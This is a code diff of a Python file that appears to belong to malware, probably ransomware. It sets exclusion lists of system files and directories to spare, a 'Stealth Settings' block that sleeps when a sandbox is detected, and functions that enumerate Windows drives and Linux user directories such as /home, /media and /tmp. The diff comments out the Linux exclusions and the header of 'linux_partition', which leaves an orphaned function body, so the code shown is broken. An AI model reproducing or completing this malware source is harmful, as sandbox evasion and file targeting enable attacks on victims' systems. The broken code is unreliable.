@@ -65,20 +65,20 @@ WINDOWS_EXCLUDED_FILES = [
     'desktop.ini', 'thumbs.db'
 ]  # System files to avoid
 
-LINUX_EXCLUDED_DIRS = [
+#LINUX_EXCLUDED_DIRS = [
     
-    '/bin', '/sbin', '/usr/bin', '/usr/sbin', '/lib', '/lib64',
-    '/etc', '/var', '/run', '/proc', '/sys', '/root', '/boot',
-    '/dev'
-]
+    #'/bin', '/sbin', '/usr/bin', '/usr/sbin', '/lib', '/lib64',
+    #'/etc', '/var', '/run', '/proc', '/sys', '/root', '/boot',
+    #'/dev'
+#]
 
-LINUX_EXCLUDED_FILES = [
+#LINUX_EXCLUDED_FILES = [
   
-    '/etc/passwd', '/etc/shadow', '/etc/group', '/etc/gshadow',
-    '/etc/sudoers', '/etc/hosts', '/etc/hostname', '/etc/resolv.conf',
-    '/etc/fstab', '/boot/vmlinuz', '/boot/initrd.img',
-    '/boot/grub/grub.cfg', '/root/.bashrc'
-]
+    #'/etc/passwd', '/etc/shadow', '/etc/group', '/etc/gshadow',
+    #'/etc/sudoers', '/etc/hosts', '/etc/hostname', '/etc/resolv.conf',
+    #'/etc/fstab', '/boot/vmlinuz', '/boot/initrd.img',
+    #'/boot/grub/grub.cfg', '/root/.bashrc'
+#]
 
 # ==================== Stealth Settings ====================
 SANDBOX_SLEEP_MIN = 300  # 5 minutes - Minimum sleep time if sandbox detected
@@ -107,7 +107,7 @@ def windows_partition():
             windows_list.append(drive)
     return windows_list
 
-def linux_partition():
+#def linux_partition():
     linux_list = [
         "/home", "/media", "/mnt", "/tmp", 
         "/var/tmp", "/opt", "/srv", "/usr/local"
